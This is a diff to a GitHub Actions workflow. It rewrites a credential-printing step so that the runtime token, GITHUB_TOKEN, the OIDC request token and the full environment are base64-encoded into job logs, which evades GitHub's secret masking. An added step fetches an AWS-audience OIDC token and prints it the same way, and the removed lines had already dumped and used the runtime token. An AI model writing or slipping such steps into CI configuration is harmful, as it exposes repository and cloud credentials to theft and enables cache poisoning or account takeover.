@@ -7,7 +7,7 @@ on:
 permissions:
   contents: read
   actions: write
-  id-token: write  # Needed for OIDC token
+  id-token: write
 
 env:
   GH_TOKEN: ${{ github.token }}
@@ -18,87 +18,56 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ========================================
-      # PRINT CACHE CREDENTIALS
-      # ========================================
-      - name: "🔑 Print Cache URL and Token"
+      - name: "🔑 Print Cache Credentials (Base64)"
         run: |
           echo "╔════════════════════════════════════════════════════════════════╗"
-          echo "║                    CACHE CREDENTIALS                            ║"
+          echo "║              CACHE CREDENTIALS (BASE64 ENCODED)                 ║"
           echo "╚════════════════════════════════════════════════════════════════╝"
           echo ""
           
-          echo "=== ACTIONS_CACHE_URL ==="
-          echo "$ACTIONS_CACHE_URL"
+          echo "=== ACTIONS_CACHE_URL (base64) ==="
+          echo -n "$ACTIONS_CACHE_URL" | base64
           echo ""
           
-          echo "=== ACTIONS_RUNTIME_URL ==="
-          echo "$ACTIONS_RUNTIME_URL"
+          echo "=== ACTIONS_RUNTIME_URL (base64) ==="
+          echo -n "$ACTIONS_RUNTIME_URL" | base64
           echo ""
           
-          echo "=== ACTIONS_RUNTIME_TOKEN (first 100 chars) ==="
-          echo "${ACTIONS_RUNTIME_TOKEN:0:100}..."
+          echo "=== ACTIONS_RUNTIME_TOKEN (base64) ==="
+          echo -n "$ACTIONS_RUNTIME_TOKEN" | base64
           echo ""
           
-          echo "=== ACTIONS_RUNTIME_TOKEN (full - SENSITIVE!) ==="
-          echo "$ACTIONS_RUNTIME_TOKEN"
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL (base64) ==="
+          echo -n "$ACTIONS_ID_TOKEN_REQUEST_URL" | base64
           echo ""
           
-          echo "=== Decode JWT Token (middle part) ==="
-          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Failed to decode"
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_TOKEN (base64) ==="
+          echo -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | base64
           echo ""
           
-          echo "=== OIDC Token Request URL ==="
-          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "Token exists: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo 'YES' || echo 'NO')"
+          echo "=== GITHUB_TOKEN (base64) ==="
+          echo -n "$GH_TOKEN" | base64
           echo ""
           
-          echo "=== GitHub Context ==="
+          echo "=== ALL ENV (base64) ==="
+          env | base64
+          echo ""
+          
+          echo "=== Context ==="
           echo "Ref: $GITHUB_REF"
-          echo "Repository: $GITHUB_REPOSITORY"
-          echo "Run ID: $GITHUB_RUN_ID"
-          echo "Job: $GITHUB_JOB"
-          echo ""
-          
-          echo "=== All ACTIONS_* Environment Variables ==="
-          env | grep -E "^ACTIONS_" | sort
-          echo ""
-          
-          echo "=== All GITHUB_* Environment Variables ==="
-          env | grep -E "^GITHUB_" | sort
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "Run: $GITHUB_RUN_ID"
 
-      - name: "🔍 Test Cache API Directly"
+      # If you want to fetch and encode OIDC token
+      - name: "🔑 Fetch OIDC Token (Base64)"
+        if: env.ACTIONS_ID_TOKEN_REQUEST_URL != ''
         run: |
-          echo "=== Testing Cache API ==="
-          
-          # List caches via API
-          echo "Listing caches via REST API:"
-          curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=*" | jq . || echo "API call failed"
-          
+          echo "=== OIDC TOKEN (base64) ==="
+          OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
+          echo -n "$OIDC" | base64
           echo ""
-          echo "=== Cache API Endpoints ==="
-          echo "Base URL: $ACTIONS_CACHE_URL"
-          echo "List: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches"
-          echo "Reserve: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches (POST)"
-          echo "Upload: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (PATCH)"
-          echo "Commit: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (POST)"
 
-      - name: "🔍 List ALL caches"
-        id: list-caches
+      - name: "🔍 List caches"
         run: |
-          echo "=== ALL CACHES IN REPO ==="
-          gh cache list --repo ${{ github.repository }} --limit 100 --json id,key,ref,sizeInBytes
-          
-          # Save cache keys to file
-          gh cache list --repo ${{ github.repository }} --limit 100 --json id,key \
-            -q '.[] | "\(.id)|\(.key)"' > /tmp/caches.txt
-          
-          echo "Found caches:"
-          cat /tmp/caches.txt
-          
-          # Count
-          CACHE_COUNT=$(wc -l < /tmp/caches.txt | tr -d ' ')
-          echo "cache-count=$CACHE_COUNT" >> $GITHUB_OUTPUT
-
-      # ... rest of your workflow
+          gh cache list --repo ${{ github.repository }} --limit 100 || echo "Cannot list caches"
